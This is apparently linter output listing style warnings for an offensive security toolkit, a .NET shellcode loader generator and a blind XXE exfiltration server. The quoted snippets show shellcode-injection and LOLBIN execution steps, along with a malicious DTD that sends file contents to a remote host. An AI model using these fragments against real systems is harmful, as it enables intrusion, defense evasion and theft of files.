764 |         payloadCode = getPayloadCode(payload.decode(errors="ignore"))
765 |
766 |     launchCode = ""
    |     ^^^^^^^^^^
767 |
768 |     if _type not in ["exec", "run-command"]:
    |

N806 Variable `exeLaunchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:770:13
    |
768 |     if _type not in ["exec", "run-command"]:
769 |         if _format == "exe":
770 |             exeLaunchCode = string.Template(
    |             ^^^^^^^^^^^^^
771 |                 CodeTemplates["exeLaunchStub"]
772 |             ).safe_substitute(
    |

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:777:13
    |
775 |             )
776 |
777 |             launchCode = exeLaunchCode
    |             ^^^^^^^^^^
778 |
779 |         elif _format == "raw":
    |

N806 Variable `shellcodeLoader` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:781:17
    |
779 |         elif _format == "raw":
780 |             if not apc:
781 |                 shellcodeLoader = string.Template(
    |                 ^^^^^^^^^^^^^^^
782 |                     CodeTemplates["inlineShellcodeLoader"]
783 |                 ).safe_substitute(
    |

N806 Variable `shellcodeLoader` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:788:17
    |
786 |                 )
787 |             else:
788 |                 shellcodeLoader = string.Template(
    |                 ^^^^^^^^^^^^^^^
789 |                     CodeTemplates["queueUserAPCShellcodeLoader"]
790 |                 ).safe_substitute(
    |

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:797:13
    |
795 |                 )
796 |
797 |             launchCode = shellcodeLoader
    |             ^^^^^^^^^^
798 |
799 |         else:
    |

N806 Variable `powershellLaunchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:803:13
    |
801 |                 payload = payload.decode(errors="ignore")
802 |
803 |             powershellLaunchCode = string.Template(
    |             ^^^^^^^^^^^^^^^^^^^^
804 |                 CodeTemplates["powershellRunspaceRunner"]
805 |             ).safe_substitute(
    |

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:810:13
    |
808 |             )
809 |
810 |             launchCode = powershellLaunchCode
    |             ^^^^^^^^^^
811 |
812 |     namespaceStart = "namespace " + namespaceName + " {"
    |

N806 Variable `namespaceStart` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:812:5
    |
810 |             launchCode = powershellLaunchCode
811 |
812 |     namespaceStart = "namespace " + namespaceName + " {"
    |     ^^^^^^^^^^^^^^
813 |     namespaceStop = "}"
    |

N806 Variable `namespaceStop` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:813:5
    |
812 |     namespaceStart = "namespace " + namespaceName + " {"
813 |     namespaceStop = "}"
    |     ^^^^^^^^^^^^^
814 |
815 |     if dontUseNamespace:
    |

N806 Variable `namespaceStart` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:816:9
    |
815 |     if dontUseNamespace:
816 |         namespaceStart = namespaceStop = ""
    |         ^^^^^^^^^^^^^^
817 |
818 |     assemblyAdditions1 = CodeTemplates["headerComment"]
    |

N806 Variable `namespaceStop` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:816:26
    |
815 |     if dontUseNamespace:
816 |         namespaceStart = namespaceStop = ""
    |                          ^^^^^^^^^^^^^
817 |
818 |     assemblyAdditions1 = CodeTemplates["headerComment"]
    |

N806 Variable `assemblyAdditions1` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:818:5
    |
816 |         namespaceStart = namespaceStop = ""
817 |
818 |     assemblyAdditions1 = CodeTemplates["headerComment"]
    |     ^^^^^^^^^^^^^^^^^^
819 |     assemblyAdditions2 = CodeTemplates["registerClassAdditions"]
820 |     assemblyAdditions3 = string.Template(
    |

N806 Variable `assemblyAdditions2` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:819:5
    |
818 |     assemblyAdditions1 = CodeTemplates["headerComment"]
819 |     assemblyAdditions2 = CodeTemplates["registerClassAdditions"]
    |     ^^^^^^^^^^^^^^^^^^
820 |     assemblyAdditions3 = string.Template(
821 |         CodeTemplates["forInstallUtilAdditions"]
    |

N806 Variable `assemblyAdditions3` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:820:5
    |
818 |     assemblyAdditions1 = CodeTemplates["headerComment"]
819 |     assemblyAdditions2 = CodeTemplates["registerClassAdditions"]
820 |     assemblyAdditions3 = string.Template(
    |     ^^^^^^^^^^^^^^^^^^
821 |         CodeTemplates["forInstallUtilAdditions"]
822 |     ).safe_substitute(templateName=templateName)
    |

N806 Variable `assemblyAdditions4` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:823:5
    |
821 |         CodeTemplates["forInstallUtilAdditions"]
822 |     ).safe_substitute(templateName=templateName)
823 |     assemblyAdditions4 = " : ServicedComponent"
    |     ^^^^^^^^^^^^^^^^^^
824 |
825 |     if _type != "regasm":
    |

N806 Variable `assemblyAdditions1` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:826:9
    |
825 |     if _type != "regasm":
826 |         assemblyAdditions1 = assemblyAdditions2 = ""
    |         ^^^^^^^^^^^^^^^^^^
827 |         assemblyAdditions3 = assemblyAdditions4 = ""
    |

N806 Variable `assemblyAdditions2` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:826:30
    |
825 |     if _type != "regasm":
826 |         assemblyAdditions1 = assemblyAdditions2 = ""
    |                              ^^^^^^^^^^^^^^^^^^
827 |         assemblyAdditions3 = assemblyAdditions4 = ""
    |

N806 Variable `assemblyAdditions3` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:827:9
    |
825 |     if _type != "regasm":
826 |         assemblyAdditions1 = assemblyAdditions2 = ""
827 |         assemblyAdditions3 = assemblyAdditions4 = ""
    |         ^^^^^^^^^^^^^^^^^^
828 |
829 |     if _type == "exec":
    |

N806 Variable `assemblyAdditions4` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:827:30
    |
825 |     if _type != "regasm":
826 |         assemblyAdditions1 = assemblyAdditions2 = ""
827 |         assemblyAdditions3 = assemblyAdditions4 = ""
    |                              ^^^^^^^^^^^^^^^^^^
828 |
829 |     if _type == "exec":
    |

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:830:9
    |
829 |     if _type == "exec":
830 |         launchCode = CodeTemplates["executeHardcodedCommandCode"].replace(
    |         ^^^^^^^^^^
831 |             "<CMD>", payloadCode
832 |         )
    |

N806 Variable `launchCode` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:835:9
    |
834 |     elif _type == "run-command":
835 |         launchCode = CodeTemplates["executeCommandFromParamCode"].replace(
    |         ^^^^^^^^^^
836 |             "<CMD>", payloadCode
837 |         )
    |

N806 Variable `msiUsing` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:840:5
    |
839 |     method = f"public void {methodName}(string command)"
840 |     msiUsing = ""
    |     ^^^^^^^^
841 |     msiReturn = ""
842 |     extraCodeOutsideOfNamespace = ""
    |

N806 Variable `msiReturn` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:841:5
    |
839 |     method = f"public void {methodName}(string command)"
840 |     msiUsing = ""
841 |     msiReturn = ""
    |     ^^^^^^^^^
842 |     extraCodeOutsideOfNamespace = ""
843 |     extraCodeWithinNamespace = ""
    |

N806 Variable `extraCodeOutsideOfNamespace` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:842:5
    |
840 |     msiUsing = ""
841 |     msiReturn = ""
842 |     extraCodeOutsideOfNamespace = ""
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^
843 |     extraCodeWithinNamespace = ""
    |

N806 Variable `extraCodeWithinNamespace` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:843:5
    |
841 |     msiReturn = ""
842 |     extraCodeOutsideOfNamespace = ""
843 |     extraCodeWithinNamespace = ""
    |     ^^^^^^^^^^^^^^^^^^^^^^^^
844 |
845 |     if globalOptions["msi_mode"]:
    |

N806 Variable `msiUsing` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:846:9
    |
845 |     if globalOptions["msi_mode"]:
846 |         msiUsing = "using Microsoft.Deployment.WindowsInstaller;"
    |         ^^^^^^^^
847 |         msiReturn = "return ActionResult.Success;"
848 |         method = f"""[CustomAction]
    |

N806 Variable `msiReturn` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:847:9
    |
845 |     if globalOptions["msi_mode"]:
846 |         msiUsing = "using Microsoft.Deployment.WindowsInstaller;"
847 |         msiReturn = "return ActionResult.Success;"
    |         ^^^^^^^^^
848 |         method = f"""[CustomAction]
849 |         public static ActionResult {methodName}(Session session)"""
    |

N806 Variable `extraCodeOutsideOfNamespace` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:852:9
    |
851 |     elif globalOptions["appdomainmanager_mode"]:
852 |         extraCodeOutsideOfNamespace = string.Template(
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
853 |             CodeTemplates["appDomainManagerCode"]
854 |         ).safe_substitute(templateName=templateName, namespaceName=namespaceName)
    |

N803 Argument name `filePath` should be lowercase
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:876:21
    |
876 | def detectFileIsExe(filePath, forced=False):
    |                     ^^^^^^^^
877 |     try:
878 |         pe = pefile.PE(filePath)
    |

F841 Local variable `pe` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:878:9
    |
876 | def detectFileIsExe(filePath, forced=False):
877 |     try:
878 |         pe = pefile.PE(filePath)
    |         ^^
879 |         return True
880 |     except pefile.PEFormatError as e:
    |
help: Remove assignment to unused variable `pe`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:880:36
    |
878 |         pe = pefile.PE(filePath)
879 |         return True
880 |     except pefile.PEFormatError as e:
    |                                    ^
881 |         return False
    |
help: Remove assignment to unused variable `e`

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:886:14
    |
884 |   def opts(argv):
885 |
886 |       epilog = f"""
    |  ______________^
887 | | ------------------------------------------------------------------------------------------------------------------------
888 | | USE CASES:
889 | |
890 | | 1) Generate .NET EXE assembly that injects shellcode into remote process and runs via QueueUserAPC:
891 | |     cmd> py generateRogueDotNet.py calc64.bin -o evil.exe --queue-apc
892 | |
893 | | 2) Generate .NET DLL assembly that executes shellcode inline/in-process
894 | |     cmd> py generateRogueDotNet.py calc64.bin -o evil.dll
895 | |
896 | | 3) Generate .NET v4 DLL assembly that executes shellcode in-process and will be used for building evil MSI:
897 | |     cmd> py generateRogueDotNet.py calc64.bin -o evil.dll --dotnet-ver v4 -M
898 | |
899 | | 4) Run Powershell through a managed runspace:
900 | |     cmd> py generateRogueDotNet.py evil.ps1 -o evil.exe --dotnet-ver v4
901 | |
902 | | 5) Generate .NET DLL assembly that runs shellcode and can be loaded with Regasm/Regsvcs/InstallUtil LOLBINs:
903 | |     cmd> py generateRogueDotNet.py calc64.bin -o evil.dll -t regasm
904 | |
905 | | 5) Generate .NET assembly that executes hardcoded system command (calc.exe):
906 | |     cmd> py generateRogueDotNet.py -o evil.dll -t exec calc.exe
907 | |
908 | | 6) Generate .NET v4 DLL assembly that executes shellcode in-process and will be used for AppDomainManager injection (aka TheWover/GhoΓÇª
909 | |     cmd> py generateRogueDotNet.py calc64.bin -o evil.dll --dotnet-ver v4 -A
910 | |
911 | | ------------------------------------------------------------------------------------------------------------------------
912 | |     """
    | |_______^
913 |
914 |       parser = argparse.ArgumentParser(
    |
help: Remove extraneous `f` prefix

N806 Variable `shellcodeExts` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1064:5
     |
1062 |         return False
1063 |
1064 |     shellcodeExts = (".bin", ".shellcode", ".shc", ".raw")
     |     ^^^^^^^^^^^^^
1065 |     executableExts = (".exe", ".dll", ".cpl", ".xll", ".wll", ".sys", ".ocx")
     |

N806 Variable `executableExts` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1065:5
     |
1064 |     shellcodeExts = (".bin", ".shellcode", ".shc", ".raw")
1065 |     executableExts = (".exe", ".dll", ".cpl", ".xll", ".wll", ".sys", ".ocx")
     |     ^^^^^^^^^^^^^^
1066 |
1067 |     outputNormalisedName = args.output.lower()
     |

N806 Variable `outputNormalisedName` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1067:5
     |
1065 |     executableExts = (".exe", ".dll", ".cpl", ".xll", ".wll", ".sys", ".ocx")
1066 |
1067 |     outputNormalisedName = args.output.lower()
     |     ^^^^^^^^^^^^^^^^^^^^
1068 |     if outputNormalisedName.endswith(".deploy"):
1069 |         outputNormalisedName = outputNormalisedName[: -len(".deploy")]
     |

N806 Variable `outputNormalisedName` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1069:9
     |
1067 |     outputNormalisedName = args.output.lower()
1068 |     if outputNormalisedName.endswith(".deploy"):
1069 |         outputNormalisedName = outputNormalisedName[: -len(".deploy")]
     |         ^^^^^^^^^^^^^^^^^^^^
1070 |
1071 |     inputIsShellcode = os.path.splitext(args.inputFile.lower())[1] in shellcodeExts
     |

N806 Variable `inputIsShellcode` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1071:5
     |
1069 |         outputNormalisedName = outputNormalisedName[: -len(".deploy")]
1070 |
1071 |     inputIsShellcode = os.path.splitext(args.inputFile.lower())[1] in shellcodeExts
     |     ^^^^^^^^^^^^^^^^
1072 |     inputIsExecutable = os.path.splitext(args.inputFile.lower())[1] in executableExts
1073 |     outputIsShellcode = (
     |

N806 Variable `inputIsExecutable` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1072:5
     |
1071 |     inputIsShellcode = os.path.splitext(args.inputFile.lower())[1] in shellcodeExts
1072 |     inputIsExecutable = os.path.splitext(args.inputFile.lower())[1] in executableExts
     |     ^^^^^^^^^^^^^^^^^
1073 |     outputIsShellcode = (
1074 |         len(args.output) > 0
     |

N806 Variable `outputIsShellcode` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1073:5
     |
1071 |     inputIsShellcode = os.path.splitext(args.inputFile.lower())[1] in shellcodeExts
1072 |     inputIsExecutable = os.path.splitext(args.inputFile.lower())[1] in executableExts
1073 |     outputIsShellcode = (
     |     ^^^^^^^^^^^^^^^^^
1074 |         len(args.output) > 0
1075 |         and os.path.splitext(outputNormalisedName)[1] in shellcodeExts
     |

F841 Local variable `outputIsShellcode` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1073:5
     |
1071 |     inputIsShellcode = os.path.splitext(args.inputFile.lower())[1] in shellcodeExts
1072 |     inputIsExecutable = os.path.splitext(args.inputFile.lower())[1] in executableExts
1073 |     outputIsShellcode = (
     |     ^^^^^^^^^^^^^^^^^
1074 |         len(args.output) > 0
1075 |         and os.path.splitext(outputNormalisedName)[1] in shellcodeExts
     |
help: Remove assignment to unused variable `outputIsShellcode`

N806 Variable `outputIsExecutable` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1077:5
     |
1075 |         and os.path.splitext(outputNormalisedName)[1] in shellcodeExts
1076 |     )
1077 |     outputIsExecutable = (
     |     ^^^^^^^^^^^^^^^^^^
1078 |         len(args.output) > 0
1079 |         and os.path.splitext(outputNormalisedName)[1] in executableExts
     |

N806 Variable `templateName` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1128:13
     |
1126 |         payload = args.inputFile
1127 |
1128 |     output, templateName = getSourceFileContents(
     |             ^^^^^^^^^^^^
1129 |         args.module,
1130 |         args.namespace,
     |

N806 Variable `previousEmpty` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1143:5
     |
1141 |     newlines = []
1142 |     i = 0
1143 |     previousEmpty = False
     |     ^^^^^^^^^^^^^
1144 |
1145 |     while i < len(lines):
     |

N806 Variable `previousEmpty` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1151:13
     |
1149 |             if not previousEmpty:
1150 |                 newlines.append("")
1151 |             previousEmpty = True
     |             ^^^^^^^^^^^^^
1152 |             i += 1
1153 |             continue
     |

N806 Variable `previousEmpty` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1155:13
     |
1153 |             continue
1154 |         else:
1155 |             previousEmpty = False
     |             ^^^^^^^^^^^^^
1156 |
1157 |         if line.startswith("//"):
     |

N806 Variable `domainManager` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1166:5
     |
1164 |     output = "\n".join(newlines)
1165 |
1166 |     domainManager = ""
     |     ^^^^^^^^^^^^^
1167 |
1168 |     if args.appdomainmanager_mode:
     |

N806 Variable `domainManager` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1169:9
     |
1168 |     if args.appdomainmanager_mode:
1169 |         domainManager = """
     |         ^^^^^^^^^^^^^
1170 |     Domain Manager : MyAppDomainManager"""
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1232:19
     |
1230 |               cmd = (
1231 |                   p
1232 |                   + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:"{}" /keyfile:key.snk "{}"'.format(
     |  ___________________^
1233 | |                     management, target, args.output, srcfile
1234 | |                 )
     | |_________________^
1235 |               )
1236 |           else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1239:19
     |
1237 |               cmd = (
1238 |                   p
1239 |                   + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:"{}" "{}"'.format(
     |  ___________________^
1240 | |                     management, target, args.output, srcfile
1241 | |                 )
     | |_________________^
1242 |               )
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1274:29
     |
1272 | """
1273 |             )
1274 |         except Exception as e:
     |                             ^
1275 |             print(
1276 |                 "[!] Error - non printable output coming from csc.exe compiler. Ignoring it..."
     |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1308:16
     |
1306 |               )
1307 |
1308 |       commands = """
     |  ________________^
1309 | |
1310 | | =====================================
1311 | | NEXT STEPS:
1312 | |
1313 | | Step 1: Create Your Strong Name Key -> key.snk (or use the one provided in this directory)
1314 | |
1315 | |     $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979ΓÇª
1316 | |     $Content = [System.Convert]::FromBase64String($key)
1317 | |     Set-Content key.snk -Value $Content -Encoding Byte
1318 | |
1319 | | Step 2: Compile source code:
1320 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll{} /target:library /out:rogue.dll /keyfiΓÇª
1321 | |
1322 | | Step 3: Execute your payload!
1323 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
1324 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll
1325 | |
1326 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
1327 | |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
1328 | |
1329 | |     %WINDIR%\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
1330 | |     %WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
1331 | |     """.format(
1332 | |         management
1333 | |     )
     | |_____^
1334 |
1335 |       if "PROGRAMFILES(X86)" in os.environ:
     |
help: Convert to f-string

W291 Trailing whitespace
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1326:74
     |
1324 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll
1325 |
1326 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
     |                                                                          ^
1327 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
     |
help: Remove trailing whitespace

W291 Trailing whitespace
    --> security\penetration-testing-tools\red-teaming\rogue-dot-net\generateRogueDotNet.py:1327:77
     |
1326 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
1327 |     %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
     |                                                                             ^
1328 |
1329 |     %WINDIR%\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
     |
help: Remove trailing whitespace

F401 [*] `time` imported but unused
  --> security\penetration-testing-tools\web\blindxxe.py:43:8
   |
41 | import sys
42 | import threading
43 | import time
   |        ^^^^
44 | import urllib
   |
help: Remove unused import: `time`

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\web\blindxxe.py:65:15
   |
63 | def dbg(x):
64 |     if config["debug"]:
65 |         print("[dbg] {}".format(x))
   |               ^^^^^^^^^^^^^^^^^^^^
   |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\blindxxe.py:97:13
    |
 96 |           print(
 97 | /             "[.] Incoming HTTP request from {}: {} {}".format(
 98 | |                 self.client_address[0], request.method, request.path[:25]
 99 | |             )
    | |_____________^
100 |           )
    |
help: Convert to f-string

W605 [*] Invalid escape sequence: `\/`
   --> security\penetration-testing-tools\web\blindxxe.py:103:24
    |
102 |         path = urllib.unquote(request.path).decode("utf8")
103 |         m = re.search("\/\?exfil=(.*)", path, re.MULTILINE)
    |                        ^^
104 |         if m and request.command.lower() == "get":
105 |             data = path[len("/?exfil=") :]
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\?`
   --> security\penetration-testing-tools\web\blindxxe.py:103:26
    |
102 |         path = urllib.unquote(request.path).decode("utf8")
103 |         m = re.search("\/\?exfil=(.*)", path, re.MULTILINE)
    |                          ^^
104 |         if m and request.command.lower() == "get":
105 |             data = path[len("/?exfil=") :]
    |
help: Use a raw string literal

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\blindxxe.py:106:19
    |
104 |         if m and request.command.lower() == "get":
105 |             data = path[len("/?exfil=") :]
106 |             print("\n[+] Exfiltrated %s:" % config["exfil-file"])
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
107 |             print("-" * 30)
108 |             print(urllib.unquote(data).decode("utf8"))
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\blindxxe.py:116:19
    |
114 |           elif request.path.endswith(".dtd"):
115 |               dbg("Sending malicious DTD file.")
116 |               dtd = """<!ENTITY %% param_exfil SYSTEM "%(exfil_file)s">
    |  ___________________^
117 | | <!ENTITY %% param_request "<!ENTITY exfil SYSTEM 'http://%(exfil_host)s:%(exfil_port)d/?exfil=%%param_exfil;'>">
118 | | %%param_request;""" % {
    | |___________________^
119 |                   "exfil_file": config["exfil-file"],
120 |                   "exfil_host": config["rhost"],
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\blindxxe.py:127:17
    |
126 |         else:
127 |             dbg("%s %s" % (request.command, request.path))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
128 |             self.response(body="false")
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\blindxxe.py:185:11
    |
183 |     config["exfil-file"] = args.file
184 |
185 |     print('[::] File to be exfiltrated: "{}"'.format(args.file))
    |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
186 |
187 |     port = int(args.port)
    |
help: Convert to f-string

F821 Undefined name `Logger`
   --> security\penetration-testing-tools\web\blindxxe.py:189:9
    |
187 |     port = int(args.port)
188 |     if port < 1 or port > 65535:
189 |         Logger.err("Invalid port number. Must be in <1, 65535>")
    |         ^^^^^^
190 |         sys.exit(-1)
    |

F821 Undefined name `Logger`
   --> security\penetration-testing-tools\web\blindxxe.py:207:9
    |
205 |     opts = parseOptions(argv)
206 |     if not opts:
207 |         Logger.err("Options parsing failed.")
    |         ^^^^^^
208 |         return False
    |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:13:1
   |
12 | try:
13 |     import xerox
   | ^^^^
14 | except ImportError:
15 |     raise ImportError, "`xerox` library not found. Install it using: `pip install xerox`"
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:15:1
   |
13 |     import xerox
14 | except ImportError:
15 |     raise ImportError, "`xerox` library not found. Install it using: `pip install xerox`"
   | ^^^^
16 | import re
   |

invalid-syntax: Unparenthesized tuple expression cannot be used here
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:15:8
   |
13 |     import xerox
14 | except ImportError:
15 |     raise ImportError, "`xerox` library not found. Install it using: `pip install xerox`"
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 | import re
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:22:1
   |
20 | data = re.sub('curl -i -s -k\s+-X', 'curl -iskX', data)
21 | if "-iskX 'GET'" in data:
22 |     data = data.replace("-iskX 'GET'", '')
   | ^^^^
23 | else:
24 |     data = re.sub(r"-iskX '([^']+)' ", r"-iskX \1 ", data)
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:24:1
   |
22 |     data = data.replace("-iskX 'GET'", '')
23 | else:
24 |     data = re.sub(r"-iskX '([^']+)' ", r"-iskX \1 ", data)
   | ^^^^
25 |
26 | superfluous_headers = {
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:27:1
   |
26 | superfluous_headers = {
27 |     'Upgrade-Insecure-Requests':'', 
   | ^^^^
28 |     'DNT':'', 
29 |     'User-Agent':'',
   |

W291 Trailing whitespace
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:27:33
   |
26 | superfluous_headers = {
27 |     'Upgrade-Insecure-Requests':'', 
   |                                    ^
28 |     'DNT':'', 
29 |     'User-Agent':'',
   |
help: Remove trailing whitespace

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:28:1
   |
26 | superfluous_headers = {
27 |     'Upgrade-Insecure-Requests':'', 
28 |     'DNT':'', 
   | ^^^^
29 |     'User-Agent':'',
30 |     'Content-Type':"application/x-www-form-urlencoded",
   |

W291 Trailing whitespace
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:28:11
   |
26 | superfluous_headers = {
27 |     'Upgrade-Insecure-Requests':'', 
28 |     'DNT':'', 
   |              ^
29 |     'User-Agent':'',
30 |     'Content-Type':"application/x-www-form-urlencoded",
   |
help: Remove trailing whitespace

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:29:1
   |
27 |     'Upgrade-Insecure-Requests':'', 
28 |     'DNT':'', 
29 |     'User-Agent':'',
   | ^^^^
30 |     'Content-Type':"application/x-www-form-urlencoded",
31 |     'Referer':'',
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:30:1
   |
28 |     'DNT':'', 
29 |     'User-Agent':'',
30 |     'Content-Type':"application/x-www-form-urlencoded",
   | ^^^^
31 |     'Referer':'',
32 | }
   |

W191 Indentation contains tabs
